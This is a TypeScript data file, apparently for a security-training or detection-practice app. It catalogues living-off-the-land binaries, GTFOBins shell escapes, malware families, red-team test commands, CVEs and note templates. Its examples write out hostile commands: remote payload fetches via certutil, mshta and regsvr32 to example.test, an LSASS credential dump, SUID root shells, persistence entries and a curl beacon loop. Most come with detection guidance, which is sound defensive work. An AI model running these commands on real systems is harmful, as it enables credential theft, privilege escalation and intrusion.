export interface KbEntryData {
  name: string;
  summary: string;
  category?: string;
  tags?: string[];
  description?: string;
  examples?: { label: string; code: string; language?: string; description?: string }[];
  mitreTechniques?: string[];
  references?: { title: string; url: string }[];
}

export const LOLBAS: KbEntryData[] = [
  {
    name: "powershell.exe",
    summary: "Built-in scripting host abused for execution, download, and lateral movement.",
    category: "execution",
    tags: ["execution", "windows", "scripting"],
    description: "Microsoft-signed binary present on every modern Windows host. Attackers abuse it for in-memory execution, encoded payloads, and AMSI bypass attempts.",
    mitreTechniques: ["T1059.001", "T1027"],
    examples: [
      { label: "Encoded command pattern", code: "powershell.exe -nop -w hidden -enc <base64>", language: "powershell", description: "Detected via 4104 Script Block Logging + Sysmon Event 1 with -enc flag." },
    ],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/" }],
  },
  {
    name: "rundll32.exe",
    summary: "DLL function executor; abused to run arbitrary exports.",
    category: "defense-evasion",
    tags: ["windows", "execution"],
    description: "Loads a DLL and executes a named export. Frequently used to proxy execution and bypass weak AppLocker policies.",
    mitreTechniques: ["T1218.011"],
    examples: [
      { label: "Comsvcs MiniDump", code: "rundll32.exe comsvcs.dll, MiniDump <PID> dump.bin full", language: "powershell", description: "Dumps a process memory (used against lsass.exe). Detect via Sysmon Event 10 ProcessAccess on lsass." },
    ],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" }],
  },
  {
    name: "mshta.exe",
    summary: "HTML Application host; runs remote HTA payloads.",
    category: "defense-evasion",
    tags: ["windows", "execution"],
    mitreTechniques: ["T1218.005"],
    examples: [{ label: "Remote HTA fetch", code: "mshta.exe https://example.test/payload.hta", language: "powershell", description: "Watch for mshta with URL command line or outbound HTTP." }],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Mshta/" }],
  },
  {
    name: "certutil.exe",
    summary: "Certificate utility abused for download and decoding.",
    category: "ingress-tool-transfer",
    tags: ["windows", "download"],
    mitreTechniques: ["T1105"],
    examples: [{ label: "Download payload", code: "certutil -urlcache -split -f https://example.test/x.exe x.exe", language: "powershell", description: "Detect certutil with -urlcache or -decode flags." }],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/" }],
  },
  {
    name: "regsvr32.exe",
    summary: "COM registration; abused via scrobj.dll for script execution.",
    category: "defense-evasion",
    tags: ["windows", "execution"],
    mitreTechniques: ["T1218.010"],
    examples: [{ label: "Squiblydoo", code: "regsvr32 /s /n /u /i:https://example.test/file.sct scrobj.dll", language: "powershell", description: "Classic Squiblydoo bypass. Detect regsvr32 + scrobj.dll combo or network connection." }],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/" }],
  },
  {
    name: "wmic.exe",
    summary: "Deprecated WMI command-line; abused for execution & discovery.",
    category: "discovery",
    tags: ["windows", "discovery"],
    mitreTechniques: ["T1047"],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Wmic/" }],
  },
  {
    name: "bitsadmin.exe",
    summary: "Background Intelligent Transfer Service tool; abused for stealthy download.",
    category: "ingress-tool-transfer",
    tags: ["windows", "download"],
    mitreTechniques: ["T1197"],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/" }],
  },
  {
    name: "msbuild.exe",
    summary: "Build engine; executes inline C# tasks from XML.",
    category: "execution",
    tags: ["windows", "execution", "dotnet"],
    mitreTechniques: ["T1127.001"],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/" }],
  },
  {
    name: "installutil.exe",
    summary: ".NET installer; runs arbitrary code via uninstall stub.",
    category: "execution",
    tags: ["windows", "execution", "dotnet"],
    mitreTechniques: ["T1218.004"],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Installutil/" }],
  },
  {
    name: "schtasks.exe",
    summary: "Task scheduler CLI; abused for persistence and lateral execution.",
    category: "persistence",
    tags: ["windows", "persistence"],
    mitreTechniques: ["T1053.005"],
    references: [{ title: "LOLBAS", url: "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/" }],
  },
];

export const GTFOBINS: KbEntryData[] = [
  {
    name: "find",
    summary: "Trusted Unix find binary; -exec spawns arbitrary commands.",
    category: "privilege-escalation",
    tags: ["linux", "suid", "shell"],
    mitreTechniques: ["T1059.004", "T1548.001"],
    examples: [{ label: "SUID shell escape", code: "find . -exec /bin/sh -p \\; -quit", language: "bash", description: "If find has SUID bit, this escalates to root. Detect via auditd rule on find with -exec." }],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/find/" }],
  },
  {
    name: "vim",
    summary: "Editor with :! shell escape.",
    category: "privilege-escalation",
    tags: ["linux", "suid", "shell"],
    mitreTechniques: ["T1548.001"],
    examples: [{ label: "Shell escape", code: ":set shell=/bin/sh\\n:shell", language: "vim" }],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/vim/" }],
  },
  {
    name: "tar",
    summary: "Archive tool; --checkpoint-action runs arbitrary commands.",
    category: "privilege-escalation",
    tags: ["linux", "suid"],
    mitreTechniques: ["T1548.001"],
    examples: [{ label: "Checkpoint exec", code: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", language: "bash" }],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/tar/" }],
  },
  {
    name: "awk",
    summary: "Text processor; system() runs arbitrary commands.",
    category: "execution",
    tags: ["linux", "shell"],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/awk/" }],
  },
  {
    name: "less",
    summary: "Pager with !shell escape.",
    category: "privilege-escalation",
    tags: ["linux", "suid"],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/less/" }],
  },
  {
    name: "python3",
    summary: "Interpreter; pty.spawn for full shells, os.system for commands.",
    category: "execution",
    tags: ["linux", "shell"],
    mitreTechniques: ["T1059.006"],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/python/" }],
  },
  {
    name: "perl",
    summary: "Interpreter with exec() and -e one-liners.",
    category: "execution",
    tags: ["linux", "shell"],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/perl/" }],
  },
  {
    name: "sudo",
    summary: "Sudo misconfigurations enable privilege escalation.",
    category: "privilege-escalation",
    tags: ["linux", "sudo"],
    mitreTechniques: ["T1548.003"],
    examples: [{ label: "Enumerate", code: "sudo -l", language: "bash", description: "Lists what current user can run as root." }],
    references: [{ title: "GTFOBins", url: "https://gtfobins.github.io/gtfobins/sudo/" }],
  },
];

export const MALWARE: KbEntryData[] = [
  {
    name: "Mimikatz",
    summary: "Credential dumping tool; extracts plaintext passwords, hashes, Kerberos tickets from LSASS.",
    category: "credential-access",
    tags: ["windows", "credentials"],
    mitreTechniques: ["T1003.001", "T1558"],
    description: "Open-source post-exploitation tool by Benjamin Delpy. Extracts credentials from LSASS memory and supports DCSync, Golden Ticket, and Silver Ticket attacks.",
    references: [{ title: "GitHub", url: "https://github.com/gentilkiwi/mimikatz" }, { title: "ATT&CK S0002", url: "https://attack.mitre.org/software/S0002/" }],
  },
  {
    name: "Cobalt Strike",
    summary: "Commercial adversary simulation framework; widely cracked and used by ransomware operators.",
    category: "command-and-control",
    tags: ["c2", "post-exploitation"],
    mitreTechniques: ["T1071.001", "T1055"],
    description: "Beacon implant supports HTTPS, DNS, SMB, and named pipe C2. Malleable C2 profiles let operators mimic legitimate traffic.",
    references: [{ title: "ATT&CK S0154", url: "https://attack.mitre.org/software/S0154/" }],
  },
  {
    name: "Emotet",
    summary: "Banking-trojan-turned-loader; primary delivery vehicle for TrickBot and Ryuk.",
    category: "loader",
    tags: ["banking", "loader"],
    mitreTechniques: ["T1566.001", "T1059.005"],
    references: [{ title: "ATT&CK S0367", url: "https://attack.mitre.org/software/S0367/" }],
  },
  {
    name: "LockBit",
    summary: "RaaS ransomware family; double-extortion model.",
    category: "ransomware",
    tags: ["ransomware", "raas"],
    mitreTechniques: ["T1486", "T1490"],
    references: [{ title: "CISA Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" }],
  },
  {
    name: "BlackEnergy",
    summary: "ICS-targeting malware used against Ukrainian power grid (2015).",
    category: "ics",
    tags: ["ics", "destructive"],
    references: [{ title: "ATT&CK S0089", url: "https://attack.mitre.org/software/S0089/" }],
  },
  {
    name: "Sliver",
    summary: "Open-source C2 framework written in Go; growing alternative to Cobalt Strike.",
    category: "command-and-control",
    tags: ["c2", "go"],
    references: [{ title: "GitHub", url: "https://github.com/BishopFox/sliver" }],
  },
];

export const ATOMIC_TESTS: {
  id: string;
  name: string;
  techniqueId: string;
  techniqueName: string;
  description: string;
  platforms: string[];
  executor: string;
  command: string;
  cleanupCommand?: string;
  inputArguments?: string;
  detectionGuidance?: string;
}[] = [
  {
    id: "T1046-1",
    name: "Port Scan",
    techniqueId: "T1046",
    techniqueName: "Network Service Discovery",
    description: "Nmap SYN scan against a host.",
    platforms: ["network", "linux", "macos"],
    executor: "bash",
    command: "nmap -sS -T4 --top-ports 1000 #{target}",
    inputArguments: "target=192.168.0.42",
    detectionGuidance: "Suricata threshold rule on TCP SYN burst from single source.",
  },
  {
    id: "T1059.001-2",
    name: "PowerShell Encoded Command",
    techniqueId: "T1059.001",
    techniqueName: "PowerShell",
    description: "Execute a base64-encoded PowerShell command.",
    platforms: ["windows"],
    executor: "powershell",
    command: "powershell.exe -enc #{encoded_cmd}",
    inputArguments: "encoded_cmd=<base64>",
    detectionGuidance: "Sysmon Event 1 with -enc/-EncodedCommand flag; 4104 Script Block Logging.",
  },
  {
    id: "T1053.005-1",
    name: "Scheduled Task at Logon",
    techniqueId: "T1053.005",
    techniqueName: "Scheduled Task",
    description: "Create a scheduled task that fires on user logon.",
    platforms: ["windows"],
    executor: "powershell",
    command: "schtasks /create /tn redforge-test /tr \"cmd /c calc.exe\" /sc onlogon",
    cleanupCommand: "schtasks /delete /tn redforge-test /f",
    detectionGuidance: "Security Event 4698 task created; baseline expected tasks.",
  },
  {
    id: "T1053.003-1",
    name: "Cron Persistence",
    techniqueId: "T1053.003",
    techniqueName: "Cron",
    description: "Add a cron entry for the current user.",
    platforms: ["linux", "macos"],
    executor: "bash",
    command: "(crontab -l 2>/dev/null; echo \"* * * * * /tmp/redforge-test.sh\") | crontab -",
    cleanupCommand: "crontab -l | grep -v redforge-test | crontab -",
    detectionGuidance: "auditd watch on /var/spool/cron and ~/.bashrc-style files.",
  },
  {
    id: "T1547.001-1",
    name: "Run Key Persistence",
    techniqueId: "T1547.001",
    techniqueName: "Registry Run Keys",
    description: "Add an HKCU Run key entry.",
    platforms: ["windows"],
    executor: "powershell",
    command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v redforge /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f",
    cleanupCommand: "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v redforge /f",
    detectionGuidance: "Sysmon Event 13 RegistryValueSet on Run/RunOnce keys.",
  },
  {
    id: "T1003.001-1",
    name: "LSASS Dump via Comsvcs",
    techniqueId: "T1003.001",
    techniqueName: "LSASS Memory",
    description: "Dump lsass.exe via rundll32 + comsvcs MiniDump.",
    platforms: ["windows"],
    executor: "powershell",
    command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Windows\\Temp\\lsass.dmp full",
    detectionGuidance: "Sysmon Event 10 ProcessAccess on lsass with GrantedAccess 0x1010/0x1410.",
  },
  {
    id: "T1218.011-1",
    name: "Rundll32 + JavaScript",
    techniqueId: "T1218.011",
    techniqueName: "Rundll32",
    description: "rundll32 javascript:... pattern for execution.",
    platforms: ["windows"],
    executor: "powershell",
    command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")",
    detectionGuidance: "Process creation rundll32 with javascript: in command line.",
  },
  {
    id: "T1071.001-1",
    name: "HTTP C2 Beacon",
    techniqueId: "T1071.001",
    techniqueName: "Web Protocols",
    description: "Simulated periodic HTTP GET beacon.",
    platforms: ["linux", "windows", "macos"],
    executor: "bash",
    command: "while true; do curl -s -o /dev/null https://example.test/ping?id=#{id}; sleep 60; done",
    inputArguments: "id=host01",
    detectionGuidance: "Zeek conn log + beacon-detection scripts; periodic same-size requests to same destination.",
  },
];

export const CVES: {
  id: string;
  summary: string;
  severity: string;
  cvss?: number;
  published?: string;
  product: string;
  vendor: string;
  description?: string;
  references?: { title: string; url: string }[];
  cwe?: string[];
}[] = [
  {
    id: "CVE-2024-3094",
    summary: "Malicious code in upstream xz/liblzma 5.6.0/5.6.1 backdooring sshd via systemd notify.",
    severity: "critical",
    cvss: 10.0,
    published: "2024-03-29T00:00:00Z",
    product: "xz/liblzma",
    vendor: "tukaani.org",
    description: "Supply-chain attack: liblzma was modified to hook RSA_public_decrypt in sshd, allowing remote unauthenticated code execution by an attacker holding the private key.",
    references: [{ title: "NVD", url: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094" }],
    cwe: ["CWE-506"],
  },
  {
    id: "CVE-2021-44228",
    summary: "Log4Shell — Log4j2 JNDI lookup RCE.",
    severity: "critical",
    cvss: 10.0,
    published: "2021-12-10T00:00:00Z",
    product: "Log4j",
    vendor: "Apache",
    description: "Crafted strings containing ${jndi:ldap://...} trigger remote class loading via JNDI in vulnerable Log4j versions.",
    references: [{ title: "NVD", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" }],
    cwe: ["CWE-502", "CWE-917"],
  },
  {
    id: "CVE-2017-0144",
    summary: "EternalBlue — SMBv1 RCE used by WannaCry.",
    severity: "critical",
    cvss: 8.1,
    published: "2017-03-14T00:00:00Z",
    product: "Windows SMBv1",
    vendor: "Microsoft",
    references: [{ title: "MSRC", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-0144" }],
  },
  {
    id: "CVE-2014-0160",
    summary: "Heartbleed — OpenSSL heartbeat read overflow leaks memory.",
    severity: "high",
    cvss: 7.5,
    published: "2014-04-07T00:00:00Z",
    product: "OpenSSL",
    vendor: "OpenSSL",
    cwe: ["CWE-125"],
    references: [{ title: "NVD", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" }],
  },
  {
    id: "CVE-2023-4863",
    summary: "libwebp heap buffer overflow exploited in the wild via images.",
    severity: "critical",
    cvss: 8.8,
    published: "2023-09-12T00:00:00Z",
    product: "libwebp",
    vendor: "Google",
    references: [{ title: "NVD", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-4863" }],
  },
  {
    id: "CVE-2022-30190",
    summary: "Follina — MS-MSDT RCE via Office documents.",
    severity: "high",
    cvss: 7.8,
    published: "2022-06-01T00:00:00Z",
    product: "MSDT",
    vendor: "Microsoft",
    references: [{ title: "MSRC", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190" }],
  },
  {
    id: "CVE-2020-1472",
    summary: "Zerologon — Netlogon authentication bypass.",
    severity: "critical",
    cvss: 10.0,
    published: "2020-08-17T00:00:00Z",
    product: "Netlogon",
    vendor: "Microsoft",
    references: [{ title: "MSRC", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472" }],
  },
  {
    id: "CVE-2019-0708",
    summary: "BlueKeep — RDP pre-auth RCE.",
    severity: "critical",
    cvss: 9.8,
    published: "2019-05-14T00:00:00Z",
    product: "Remote Desktop Services",
    vendor: "Microsoft",
    references: [{ title: "MSRC", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708" }],
  },
];

export const NOTE_TEMPLATES: { id: string; name: string; description: string; body: string }[] = [
  {
    id: "mission-debrief",
    name: "Mission Debrief",
    description: "Post-mission narrative + lessons learned.",
    body: `# Mission Debrief — <Scenario Name>

## Verdict
- **Technique identified:** 
- **MITRE:** Txxxx.xxx
- **Score:** 

## Timeline
- T+00: 
- T+05: 
- T+15: 

## Evidence
- 

## What worked
- 

## What I missed
- 

## Detection improvements
- [ ] Add Sigma rule 
- [ ] Tune existing rule
`,
  },
  {
    id: "technique-study",
    name: "Technique Study",
    description: "Deep-dive on a MITRE ATT&CK technique.",
    body: `# Txxxx — <Technique Name>

## TL;DR
One sentence.

## Attacker behavior
- 

## Telemetry / Data sources
- Sysmon 
- Auditd 
- EDR 

## Detection rule (draft)
\`\`\`
\`\`\`

## Hunt queries
\`\`\`
\`\`\`

## Mitigations
- 

## Real-world examples
- 

## References
- 
`,
  },
  {
    id: "incident-runbook",
    name: "Incident Runbook",
    description: "Triage steps for a specific alert.",
    body: `# Runbook: <Alert Name>

## Trigger
- Source: 
- Severity: 

## First 5 minutes
1. 
2. 
3. 

## Containment
- 

## Eradication
- 

## Recovery
- 

## Lessons / Follow-up
- 
`,
  },
  {
    id: "blank",
    name: "Blank",
    description: "Empty note.",
    body: "",
  },
];
